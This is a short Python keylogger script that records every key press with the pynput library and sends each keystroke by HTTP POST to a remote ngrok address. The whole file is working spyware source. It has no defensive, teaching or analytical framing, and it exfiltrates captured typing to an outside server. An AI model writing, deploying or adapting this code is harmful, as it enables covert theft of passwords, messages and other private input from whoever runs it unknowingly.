from pynput.keyboard import Listener
import requests

# Remote server URL (your Ngrok URL)
remote_server = "http://efc4-2401-4900-a5bd-f558-48e4-5a2b-3979-b98d.ngrok-free.app".strip()

def log_keystrokes(key):
    key = str(key).replace("'", "")

    if key == "key.space":
        key = " "
    elif key == "key.enter":
        key = "\n"
    elif key == "key.backspace":
        key = "[BACKSPACE]"
    elif key == "key.shift" or key == "key.shift_r":
        key = "[SHIFT]"
    elif key == "key.ctrl" or key == "key.ctrl_r":
        key = "[CTRL]"
    elif key == "key.alt" or key == "key.alt_r":
        key = "[ALT]"
    elif key.startswith("key"):
        key = f"[{key.split('.')[1].upper()}]"

    # Send the captured keystroke to the remote server
    try:
        response = requests.post(remote_server + "/log", data=key)
        if response.status_code == 200:
            print("Keystroke sent successfully.")
        else:
            print("Failed to send keystroke.")
    except Exception as e:
        print(f"Error sending data: {e}")

with Listener(on_press=log_keystrokes) as listener:
    listener.join()
